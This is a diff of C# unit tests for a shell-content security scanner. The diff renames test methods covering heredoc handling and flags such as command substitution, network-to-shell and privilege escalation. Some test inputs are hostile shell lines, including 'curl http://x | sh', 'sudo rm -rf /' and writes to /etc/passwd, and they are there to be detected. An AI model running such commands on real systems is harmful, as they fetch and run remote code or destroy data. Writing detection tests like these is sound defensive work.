         Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal));
     }
 
     [Fact]
-    public void Command_substitution_inside_unquoted_heredoc_body_is_flagged()
+    public void Scan_CommandSubstitutionInsideUnquotedHeredocBody_FlagsMedium()
     {
         // An unquoted delimiter expands the body: $(...) really runs.
         AssertHasFinding("cat <<EOF\ndest=$(basename x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
     }
 
     [Fact]
-    public void Tab_stripping_heredoc_terminates_on_indented_delimiter()
+    public void Scan_TabStrippingHeredocIndentedDelimiter_TerminatesAndResumesScanning()
     {
         var findings = Scan("cat <<-'EOF'\n\t$(x)\n\tEOF\nsudo whoami\n");
 
@@ -998,7 +998,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Non_tab_indentation_does_not_terminate_tab_stripping_heredoc()
+    public void Scan_TabStrippingHeredocSpaceIndentedDelimiter_CommandSubstitutionNotFlagged()
     {
         // <<- strips tabs only; a space-indented delimiter is still body content.
         var findings = Scan("cat <<-'EOF'\n $(x)\n EOF\n$(y)\nEOF\n");
@@ -1008,19 +1008,19 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Quoted_heredoc_piped_to_shell_keeps_body_live()
+    public void Scan_QuotedHeredocPipedToShell_FlagsMedium()
     {
         AssertHasFinding("cat <<'EOF' | sh\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
     }
 
     [Fact]
-    public void Quoted_heredoc_piped_to_interpreter_keeps_body_live()
+    public void Scan_QuotedHeredocPipedToInterpreter_FlagsMedium()
     {
         AssertHasFinding("cat <<'EOF' | python3\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
     }
 
     [Fact]
-    public void Unterminated_quoted_heredoc_suppresses_to_end_of_content()
+    public void Scan_UnterminatedQuotedHeredoc_NoFindings()
     {
         var findings = Scan("cat <<'EOF'\n$(x)\n${!y}");
 
@@ -1028,14 +1028,14 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Heredoc_body_still_flags_blocking_rules()
+    public void Scan_HeredocBody_StillFlagsBlockingRules()
     {
         // F2 only suppresses the non-blocking expansion rules.
         AssertHasFinding("cat <<'EOF'\ncurl http://x | sh\nEOF\n", "network-to-shell", FindingSeverity.Critical);
     }
 
     [Fact]
-    public void Variable_indirection_inside_quoted_heredoc_body_is_suppressed()
+    public void Scan_VariableIndirectionInsideQuotedHeredocBody_NotFlagged()
     {
         var findings = Scan("cat <<'EOF'\ncmd=${!name}\nEOF\n");
 
@@ -1043,7 +1043,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Scan_resumes_normally_after_heredoc_terminator()
+    public void Scan_AfterHeredocTerminator_ScanningResumes()
     {
         var findings = Scan("cat <<'EOF'\nplain body text\nEOF\nsudo whoami\n");
 
@@ -1052,7 +1052,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Herestring_is_not_treated_as_heredoc()
+    public void Scan_Herestring_FlagsCommandSubstitutionOnce()
     {
         var findings = Scan("read -r x <<< $(y)");
 
@@ -1061,7 +1061,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Shift_and_arithmetic_are_not_heredocs()
+    public void Scan_ShiftAndArithmeticOperators_CommandSubstitutionFlagsOnce()
     {
         var findings = Scan("x=$((1 << 5))\nshift 2\n");
 
@@ -1070,13 +1070,13 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Quoted_double_less_than_is_not_a_heredoc()
+    public void Scan_QuotedDoubleLessThan_CommandSubstitutionFlagsMedium()
     {
         AssertHasFinding("echo \"<<EOF\"\n$(x)\n", "command-substitution", FindingSeverity.Medium);
     }
 
     [Fact]
-    public void Consecutive_heredocs_are_consumed_in_order()
+    public void Scan_ConsecutiveHeredocs_ConsumedInOrder()
     {
         var findings = Scan("diff <<'A' <<'B'\n$(x)\nA\n$(y)\nB\nsudo whoami\n");
 
@@ -1087,7 +1087,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Heredoc_body_lines_keep_hash_as_literal_data()
+    public void Scan_HeredocBodyHashLine_QuotedSuppressedUnquotedFlagged()
     {
         // No comment stripping inside bodies: the $( after # is still body content and is
         // suppressed by the quoted delimiter, while an unquoted body would flag it.
@@ -1105,7 +1105,7 @@ public class ShellContentScannerTests
     [InlineData("cat <<EOF\n# run: sudo systemctl restart foo\nEOF\n")]
     // tab-indented comment in tab-stripping body
     [InlineData("cat <<-'EOF'\n\t# run: sudo systemctl restart foo\nEOF\n")]
-    public void Privilege_escalation_on_heredoc_comment_lines_is_suppressed(string content)
+    public void Scan_HeredocCommentLines_PrivilegeEscalationNotFlagged(string content)
     {
         // A '#' line is a shell comment in a live body and help text in a data body -
         // nothing on it ever runs as a command.
@@ -1115,7 +1115,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_on_heredoc_comment_lines_is_suppressed()
+    public void Scan_HeredocCommentLines_WriteOutsideBuildRootNotFlagged()
     {
         var findings = Scan("cat <<'EOF'\n#   $ echo x | sudo tee /etc/foo\nEOF\n");
 
@@ -1126,7 +1126,7 @@ public class ShellContentScannerTests
     [Theory]
     [InlineData("cat <<'EOF'\nsudo rm -rf /\nEOF\n", "privilege-escalation")]
     [InlineData("cat <<'EOF'\necho x > /etc/passwd\nEOF\n", "write-outside-build-root")]
-    public void Non_comment_heredoc_body_lines_are_still_flagged(string content, string ruleId)
+    public void Scan_NonCommentHeredocBodyLines_FlagsHigh(string content, string ruleId)
     {
         // A heredoc body can be piped to an interpreter or written into an installed
         // script, so live-looking lines in it keep their findings.
